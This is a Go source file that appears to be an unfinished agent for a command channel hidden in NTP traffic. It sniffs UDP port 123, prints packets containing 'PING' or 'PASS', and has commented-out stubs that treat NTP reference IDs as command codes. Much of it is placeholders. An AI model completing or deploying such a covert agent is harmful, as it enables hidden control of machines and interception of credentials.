package handler

import (
	"bytes"
	"fmt"
	"log"
	"mesa/goclient/pkg/agent"
	"os/exec"

	//"mesa/goclient/pkg/agent"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

//sniff for NTP traffic
//buffer?

func StartSniffer(newAgent agent.Agent) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		fmt.Println("nothing")
	}

	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, "ipconfig /all").Output() //getting ethernet description for pcap
	if err != nil {
		fmt.Println(err.Error())
		fmt.Println("Couldn't execute command")
	}

	fmt.Println(string(output))

	for _, device := range devices {
		if device.Description == string(output) {
			//fix tomorrow
		}
		fmt.Println("\nName: ", device.Name, device.Description)
	}

	var (
		iface  = "TEMP"
		buffer = int32(1600)
		filter = "udp and port 123" //More?
	)

	handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	defer handler.Close()

	if err := handler.SetBPFFilter(filter); err != nil {
		log.Fatal(err)
	}

	source := gopacket.NewPacketSource(handler, handler.LinkType())
	for packet := range source.Packets() {
		harvestInfo(packet)
	}
}

func harvestInfo(packet gopacket.Packet) {
	app := packet.ApplicationLayer()
	if app != nil {
		payload := app.Payload()
		dst := packet.NetworkLayer().NetworkFlow().Dst()
		if bytes.Contains(payload, []byte("PING")) {
			fmt.Print(dst, "  ->  ", string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(dst, " -> ", string(payload))
		}
	}
}

func newConnection() {
	fmt.Println("woah it actually got something")
}

//encode/decode/craft packets
/*
func Encode(data string) Packet { //fix args

}

func Decode(packet ntppacket.NTPPacket) string {
	fmt.Print("yes")
	return "yes"
}
*/

//send traffic

// func resync(agent Agent) {

// }

/*
refID := "temp" //actually parsed

	if refId == "PING" {
		//something
	}else if refId == "COMU" {
		//something
	}else if refId == "COMD" {
		//something
	}else if refId == "GPS" {
		//something
	}else {
		//???
	}
*/
/*
func main() {
	conn, err := net.Dial(connType, connHost+":"+connPort)

	if err != nil {
		fmt.Println("Error connecting:", err.Error())
		os.Exit(1)
	}

	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("Message: ")

		input, _ := reader.ReadBytes('\n')

		conn.Write(input)

		message, _ := bufio.NewReader(conn).ReadString('\n')

		log.Print("Server echo: ", message)
	}
}
*/
